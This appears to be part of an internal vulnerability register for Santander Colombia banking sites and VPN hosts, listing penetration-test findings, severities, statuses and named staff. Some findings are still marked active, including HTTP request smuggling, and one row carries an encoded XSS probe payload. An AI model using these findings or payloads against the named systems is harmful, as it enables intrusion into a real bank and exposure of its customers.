  </r>
  <r>
    <n v="215"/>
    <s v="BSNC"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="HELICOPTER-W388-5"/>
    <m/>
    <x v="113"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-02-12T00:00:00"/>
    <n v="1227"/>
    <d v="2023-05-13T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-04-02T00:00:00"/>
    <s v="Fuzzing y enumeración revelaron la página de inicio de sesión en https://www.santander.com.co/Web/Login.aspx?_x000a_ReturnUrl=%2fWeb%2f que es un inicio de sesión backend CMS expuesto al público. Esto viola la política de Santander_x000a_que establece: &quot;El cliente está particularmente interesado en cualquier portal de administración expuesto para este activo, ya que va en contra de la política del Santander tenerlos expuestos en la red._x000a_la política del Santander tenerlos expuestos en Internet, estén o no protegidos por contraseña&quot;."/>
    <s v="Asegurar el directorio con un error 403 Forbidden, mientras que la lista blanca de direcciones IP específicas que se les permite acceder a este directorio, que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache)._x000a_acceder a este directorio, lo que se puede hacer a través de archivos de configuración (.htaccess para servidores Apache y_x000a_nginx.conf para servidores nginx) o utilizando un Firewall de Aplicaciones Web."/>
    <s v="Si bien esto no es una amenaza inmediata, un panel de acceso administrativo expuesto y obvio puede hacer que sea_x000a_para los atacantes, especialmente si los controles de acceso se limitan a las combinaciones de nombre de usuario y contraseña._x000a_de usuario y contraseña."/>
    <d v="2023-09-30T00:00:00"/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="216"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-6526b807"/>
    <s v="CO-23-CNMPA-001-AP-001"/>
    <x v="114"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="4.2"/>
    <m/>
    <n v="190242107210"/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-02-15T00:00:00"/>
    <n v="1224"/>
    <d v="2023-05-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-06T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:_x000a_• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;HttpOnly&quot;, evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de estos dentro de la aplicación."/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Victor Andres Aragon Valencia"/>
  </r>
  <r>
    <n v="217"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-6526c243"/>
    <s v="CO-23-CNMPA-001-CO-002"/>
    <x v="115"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="3.1"/>
    <m/>
    <n v="190242107210"/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-02-15T00:00:00"/>
    <n v="1224"/>
    <d v="2023-06-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-17T00:00:00"/>
    <s v="El protocolo TLS y el protocolo SSL v3.0 no asocia apropiadamente la renegociación del Handshake_x000a_SSL en una conexión existente, lo que permite ataques man-in-the-middle en los que el atacante_x000a_inserta datos en sesiones HTTPS, y posiblemente otro tipo de sesiones protegidas por SSL o TLS,_x000a_enviando una petición de autenticación que es procesada retroactivamente por un servidor en un_x000a_contexto post-renegociación. Se trata de un ataque de &quot;inyección de texto plano&quot;, también conocido_x000a_como el problema del &quot;Proyecto Mogul&quot;."/>
    <s v="La mitigación de los ataques a certificado HTTPS del cliente es difícil e implica ventajas y desventajas. Una posible solución consiste en exigir la presentación de certificados de cliente de inmediato, antes de la presentación de la solicitud HTTP al servidor. Aunque es factible, la aplicación de esta función por el software de servidor web puede ser incompatible - mientras que el certificado que se le pida, el cliente puede, en algunos casos simplemente se niegan a responder con un certificado válido. En esos casos, el servidor puede recurrir a la comportamiento vulnerable. Este cambio también tiene el efecto secundario de transmisión de la cadena de certificado de cliente en el claro, mientras que antes estaba protegida dentro de la primera sesión cifrada."/>
    <s v="Un atacante remoto no autenticado puede ser capaz de aprovechar este problema para inyectar una cantidad arbitraria de texto sin formato en el principio de la secuencia de protocolo de aplicación, que podría facilitar los ataques man-in-the-middle si el servicio asume las sesiones antes y después de la renegociación son del mismo 'cliente' y combina en la capa de aplicación."/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Victor Andres Aragon Valencia"/>
  </r>
  <r>
    <n v="218"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="VPN"/>
    <s v="MAN-6526c244"/>
    <s v="CO-23-CNMPA-001-CO-003"/>
    <x v="116"/>
    <m/>
    <s v="Dismissed"/>
    <x v="2"/>
    <n v="2.6"/>
    <m/>
    <n v="190242107210"/>
    <s v="vpnco2.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-02-15T00:00:00"/>
    <n v="1224"/>
    <d v="2023-06-15T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-03-17T00:00:00"/>
    <s v="Se ha identificado una configuración inadecuada de la política CSP permitiendo usar la política_x000a_default-src con valor self. En las siguientes imágenes se puede observar el encabezado “Content-_x000a_Security-Policy” configurado inadecuadamente"/>
    <s v="Se recomienda establecer la cabecera strict-script: script-dynamic y definir la cabecera object-src 'none'."/>
    <s v="Sin una correcta configuración del encabezado CSP, es posible que un atacante abuse de otras vulnerabilidades, como XSS, para cargar recursos adicionales como scripts o exploits en los navegadores de las víctimas para aumentar los vectores de ataque que tienen a su disposición."/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Victor Andres Aragon Valencia"/>
  </r>
  <r>
    <n v="219"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-23682f92"/>
    <s v="SC-23-CNMPO-003-CO-001"/>
    <x v="117"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-09-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La ausencia de un correcto control de captura y manejo de errores en la aplicación presenta múltiples problemas de seguridad. La problemática más común suele ser la revelación de información interna en mensajes de error, tales como dumps o información interna de la base de datos, información específica de la tecnología utilizada, volcados de pila, etc._x000a__x000a_Las pruebas realizadas sobre https://www.santander.com.co demuestran que es posible generar un error HTTP 403 enviando una petición HTTP a través del método PUT._x000a_A continuación se muestran como el error HTTP 403 no capturado por el aplicativo revela la versión de Apache Tomcat 8.5.13 utilizada en el endpoint."/>
    <s v="Se deben capturar y controlar todas las excepciones producidas en la aplicación, o en los sistemas que las sustentan, evitando proporcionar información útil a un posible atacante. Adicionalmente, se recomienda personalizar las páginas de error HTTP 40x y 50x para que no sean descriptivas."/>
    <s v="Con esta información un atacante puede obtener información interna de la aplicación que se muestre en el error generado (Por ejemplo, volcados de pila) además de información interna sobre las tecnologías utilizadas para sustentar la aplicación en caso de que los errores producidos muestren información acerca del motivo del error. Dada esta información, el atacante podrá realizar ataques especialmente dirigidos, con mayor probabilidad de éxito, sobre las aplicaciones afectadas y/o los sistemas que la sustentan."/>
    <s v="Pre:_x000a_1° Fecha: 16/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 21/09/2024"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="220"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-415c99bd"/>
    <s v="SC-23-CNMPO-003-CO-002"/>
    <x v="5"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="4.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-09-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de las tecnologías utilizadas para desarrollar la aplicación y/o de la infraestructura utilizada para sustentar la misma. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros._x000a__x000a_Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación http://www.santander.com.co revelan información interna acerca del Tipo de Servidor y/o infraestructura interna de la aplicación._x000a_A continuación, se incluye evidencia de la exposición de la versión de Microsoft Internet Information Server 10.0 a través de la cabecera de respuesta “Server”"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. Para más información consulte en: https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la version y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <s v="1° Fecha: 09/08/2024_x000a_2° Fecha: 31/10/2024"/>
    <s v="Se debe modificar una llave de registro en el servidor."/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="221"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-23682f95"/>
    <s v="SC-23-CNMPO-003-CO-003"/>
    <x v="114"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-10-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <s v="El identificador de sesión almacenado en la cookie, es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario._x000a__x000a_Durante las pruebas realizadas se ha observado que la cookie &quot;dtCookie&quot; no tiene aplicado el atributo de seguridad HttpOnly. Este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;HttpOnly&quot;, evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 09/08/2024"/>
    <s v="Reevaluada / Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="222"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-23682f96"/>
    <s v="SC-23-CNMPO-003-CO-004"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.4"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-10-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-09-12T00:00:00"/>
    <s v="El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar con la finalidad de usurpar el identificador de sesión._x000a__x000a_Durante las pruebas realizadas se ha observado que las cookie &quot;dtCookie&quot; no tiene aplicado el atributo de seguridad secure. Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs."/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;secure&quot;, evitando que el identificador de sesión pueda ser transmitido por canales no seguros. La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="1° Fecha: 09/08/2024"/>
    <s v="Reevaluada / Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="223"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-23682f97"/>
    <s v="SC-23-CNMPO-003-CO-005"/>
    <x v="119"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.2"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-10-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-23T00:00:00"/>
    <s v="BREACH es una instancia del ataque CRIME contra la compresión HTTP de tipo gzip o DEFLATE a_x000a_través de la opción de la codificación de contenido dentro de HTTP. Este ataque se centra en la_x000a_realización de una búsqueda inicial de fuerza bruta ciega para adivinar unos pocos bytes, seguido_x000a_por una búsqueda de divide-y-vencerás para expandir un acierto a una gran cantidad de contenido_x000a_arbitraria._x000a__x000a_Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece_x000a_compresión Gzip en sus conexiones. A continuación, se muestra una evidencia de que el activo es_x000a_vulnerable a BREACH:"/>
    <s v="Como resultado, los clientes y los servidores están obligados, ya sea a desactivar la compresión HTTP por completo, reduciendo el rendimiento, o a adoptar soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como el uso de protección de falsificación de petición en sitios cruzados (CSRF). Otro enfoque sugerido es desactivar la compresión HTTP cada vez que la cabecera indica una petición entre sitios cruzados, o cuando la cabecera no está presente.5 Este enfoque permite una mitigación eficaz del ataque sin perder funcionalidad, sólo incurrir en una penalización de rendimiento en las solicitudes afectadas.Como resultado, los clientes y los servidores están obligados, ya sea a desactivar la compresión HTTP por completo, reduciendo el rendimiento, o a adoptar soluciones elaboradas para tratar de frustrar BREACH en escenarios de ataque individuales, como el uso de protección de falsificación de petición en sitios cruzados (CSRF).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omo se desactivaría la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: • Deshabilite el módulo mod_deflate utilizando el siguiente comando: $ sudo a2dismod deflate • Reinicie el servidor: $ sudo /etc/init.d/apache2 restart Deshabilitar compresión en NGINX: • Establezca la configuración del host con la opción gzip en off: server { server_name www.example.com;_x000a_listen 443 ssl http2; gzip off; }"/>
    <s v="Un atacante podría aprovechar la vulnerabilidad indicada para descifrar el tráfico entre un cliente y el servidor, y con ello ver todas las comunicaciones entre ambos en claro (datos personales, credenciales de usuario...)."/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="224"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-23682f98"/>
    <s v="SC-23-CNMPO-003-CO-006"/>
    <x v="10"/>
    <m/>
    <s v="Active"/>
    <x v="2"/>
    <n v="3.2"/>
    <s v="CVE-2013-0169"/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-10-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El servidor us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Chaining) son potencialmente vulnerables a este tipo ataques. _x000a__x000a_Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a LUCKY13. A continuación se muestran los resultados que verifican la vulnerabilidad."/>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hechos a mano, también conocido como el &quot;Lucky Thirteen&quot; de emisión. Un atacante puede aprovechar la vulnerabilidad indicada para descifrar el tráfico entre un cliente y el website y ver todo el intercambio de información que se produzca entre ellos."/>
    <s v="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 https://www.openssl.org/source/"/>
    <s v="Sin definir"/>
    <m/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="225"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="MAN-2367be63"/>
    <s v="SC-23-CNMPO-002-AP-002"/>
    <x v="120"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.5"/>
    <m/>
    <m/>
    <s v="confirming-factoring.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-06-16T00:00:00"/>
    <n v="1103"/>
    <d v="2023-09-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-09-20T00:00:00"/>
    <s v="El protocolo TLS y el protocolo SSL v3.0 no asocia apropiadamente la renegociación del Handshake SSL en una conexión existente, lo que permite ataques man-in-the-middle en los que el atacante inserta datos en sesiones HTTPS, y posiblemente otro tipo de sesiones protegidas por SSL o TLS, enviando una petición de autenticación que es procesada retroactivamente por un servidor en un contexto post-renegociación. Se trata de un ataque de &quot;inyección de texto plano&quot;, también conocido como el problema del &quot;Proyecto Mogul&quot;._x000a__x000a_se ha identificado la versión del software Zoom Indexer mediante la siguiente URL:_x000a_https://confirming-factoring.santander.com.co/factoring/ayuda/settings.js_x000a_el software indicado se ha podido confirmar que la última versión disponible sería la v8.0 build 1019._x000a_Posteriormente, durante el análisis de la aplicación se ha identificado un posible DOM based XSS injection relacionado con el uso del software Zoom Indexer, concretamente analizando el código fuente del siguiente script:_x000a_https://confirming-factoring.santander.com.co/factoring/ayuda/zoom_search.js"/>
    <s v="Se recomienda utilizar versiones actualizadas del software y/o plataformas tecnológicas utilizadas, en caso de no ser posible aplicar todas las actualizaciones de seguridad publicadas para la versión utilizada."/>
    <s v="Utilizar un software desactualizado podría permitir a un atacante identificar dicho software y explotar cualquier vulnerabilidad conocida para tomar el control del activo analizado."/>
    <d v="2023-09-10T00:00:00"/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="226"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <m/>
    <m/>
    <m/>
    <s v="Supernet/Empresas"/>
    <s v="MAN-2367be67"/>
    <s v="SC-23-CNMPO-004-AP-001"/>
    <x v="60"/>
    <m/>
    <s v="Active"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://www.santander.com.co/Empresas/"/>
    <m/>
    <m/>
    <d v="2023-07-12T00:00:00"/>
    <n v="1077"/>
    <d v="2023-10-10T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Las vulnerabilidades de contrabando de solicitudes HTTP surgen cuando los sitios web enrutan solicitudes HTTP a través de servidores web con un análisis HTTP inconsistente. Al proporcionar una solicitud que diferentes servidores interpretan como de diferentes longitudes, un atacante puede envenenar el socket TCP/TLS de back-end y anteponer datos arbitrarios a la siguiente solicitud. Dependiendo de la funcionalidad del sitio web, esto se puede usar para eludir las reglas de seguridad de front-end, acceder a los sistemas internos, envenenar los cachés web y lanzar una variedad de ataques a los usuarios que navegan activamente por el sitio._x000a__x000a_Es posible manipular las peticiones de forma enviadas al frontend, de forma que, al realizar una petición, recibamos la respuesta de otra petición que no corresponda a nuestra petición sino a una anterior._x000a_se añade al final una petición nueva a un path inexistente: “GET /quo4pqqbqmyqwk39w3fdf67bv21wpndh95zspge HTTP/1.1”_x000a_la siguiente petición, el servidor le responda lo de la petición anterior, mostrando un error de recurso no encontrado “Not Found”, relativo al: “GET /quo4pqqbqmyqwk39w3fdf67bv21wpndh95zspge HTTP/1.1”_x000a_Esto puede servir para interceptar peticiones de otros usuarios pudiendo obtener datos sensibles como credenciales o datos personales."/>
    <s v="Puede resolver todas las variantes de esta vulnerabilidad configurando el servidor front-end para usar exclusivamente HTTP/2 cuando se comunique con sistemas back-end. Alternativamente, puede asegurarse de que todos los servidores de la cadena ejecuten el mismo software de servidor web con la misma configuración. Es probable que deshabilitar la reutilización de la conexión back-end reduzca el impacto de esta vulnerabilidad, pero no mitiga todas las posibles vulnerabilidades. Las instancias específicas de esta vulnerabilidad se pueden resolver reconfigurando el servidor front-end para normalizar las solicitudes ambiguas antes de enrutarlas. Como alternativa, puede configurar el servidor de back-end para rechazar el mensaje y cerrar la conexión cuando encuentre una solicitud ambigua."/>
    <s v="Cuando el servidor front-end reenvía solicitudes HTTP a un servidor back-end, normalmente envía varias solicitudes a través de la misma conexión de red back-end, porque esto es mucho más eficiente y eficaz. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente. En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes. De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpreten de manera diferente. El atacante hace que parte de su solicitud de front-end sea interpretada por el servidor de back-end como el inicio de la siguiente solicitud. Se antepone efectivamente a la siguiente solicitud y, por lo tanto, puede interferir con la forma en que la aplicación procesa esa solicitud. Este es un ataque de contrabando de solicitudes y puede tener resultados devastadores."/>
    <s v="1° Fecha: 31/10/2024"/>
    <s v="Para revisión con SDS México"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="227"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-2367be68"/>
    <s v="SC-23-CNMPO-004-AP-002"/>
    <x v="114"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.1"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-07-12T00:00:00"/>
    <n v="1077"/>
    <d v="2023-11-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El identificador de sesión almacenado en la cookie, es accesible a través de secuencias de comandos ejecutados en el navegador (JavaScript, ActiveX). De esta manera, en caso de poder inyectar código malintencionado en el navegador del usuario, haciendo uso de las vulnerabilidades de Cross Site Scripting localizadas en la aplicación, se podría usurpar el identificador de sesión del usuario._x000a__x000a_se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:_x000a_• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente._x000a_La siguiente captura demuestra la ausencia del atributo mencionado:_x000a_- https://www.santander.com.co/index.html"/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;HttpOnly&quot;, evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX). La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <s v="Se realizará validación con el equipo de SDS México para revisar como podemos hacer la implementación"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="228"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-2367be69"/>
    <s v="SC-23-CNMPO-004-AP-003"/>
    <x v="118"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.4"/>
    <m/>
    <m/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2023-07-12T00:00:00"/>
    <n v="1077"/>
    <d v="2023-11-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El identificador de sesión almacenado en la cookie no se encuentra debidamente protegido mediante el atributo “secure”, lo cual permite poder transmitir los identificadores de sesión mediante canales HTTP sin cifrar con la finalidad de usurpar el identificador de sesión._x000a__x000a_Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:_x000a_secure – este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs._x000a_La siguiente cookie no establece el indicador de cookie secure:_x000a_https://www.santander.com.co/index.html"/>
    <s v="Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad &quot;secure&quot;, evitando que el identificador de sesión pueda ser transmitido por canales no seguros. La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger."/>
    <s v="El robo de cookies podría permitir a un usuario malintencionado acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <s v="Pre:_x000a_1° Fecha: 23/08/2024_x000a__x000a_Pro:_x000a_1° Fecha: 30/09/2024"/>
    <s v="Se realizará validación con el equipo de SDS México para revisar como podemos hacer la implementación"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="229"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <m/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-b54c5eae-5002-4518-b4c8-4298f33d2756"/>
    <m/>
    <x v="121"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-05-06T00:00:00"/>
    <n v="1144"/>
    <d v="2023-08-04T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2023-09-17T00:00:00"/>
    <s v="Se ha encontrado un mensaje de error detallado durante la exploración._x000a__x000a_https://www.santander.com.co/web/GenericErrorPage.htm?aspxerrorpath=%00%3Cscript%3Ealert(81)%3B_q%3Drandom(X170927088Y1_1Z)%3C%2Fscript%3E"/>
    <s v="Implemente una gestión sólida de errores y excepciones para garantizar que la aplicación web sólo muestre mensajes de error genéricos. Evite devolver rastros de pila, información de depuración u otros detalles técnicos al cliente.  La aplicación también debe implementar una validación rigurosa de los datos de entrada. Restrinja los datos proporcionados por el usuario para que consistan en un conjunto mínimo de caracteres necesarios para el campo de entrada y valide los datos para asegurarse de que se ajustan al formato esperado._x000a__x000a_Traducción realizada con la versión gratuita del traductor www.DeepL.com/Translator"/>
    <m/>
    <m/>
    <s v="Falso positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="230"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-42a024ed-0454-4712-b053-88afeaf2c0f5"/>
    <m/>
    <x v="122"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <n v="6.1"/>
    <m/>
    <m/>
    <s v="www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <m/>
    <m/>
    <d v="2023-04-15T00:00:00"/>
    <n v="1165"/>
    <d v="2023-07-14T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-06-28T00:00:00"/>
    <s v="jQuery es una biblioteca JavaScript diseñada para simplificar el recorrido y la manipulación del árbol DOM de HTML, así como la gestión de eventos, la animación CSS y Ajax._x000a_La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad._x000a__x000a_https://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F"/>
    <s v="Consulte la información proporcionada en la sección de respuestas.  Consulte también los avisos de seguridad del proveedor relacionados con la versión vulnerable de la biblioteca."/>
    <m/>
    <d v="2023-09-30T00:00:00"/>
    <s v="Fecha de decomiso:_x000a__x000a_31/12/2023_x000a_RITM011127933"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="231"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Supernet"/>
    <s v="QA-WAS-dc64856f-c91c-4dbf-bfc6-49ca21d81d17"/>
    <m/>
    <x v="58"/>
    <m/>
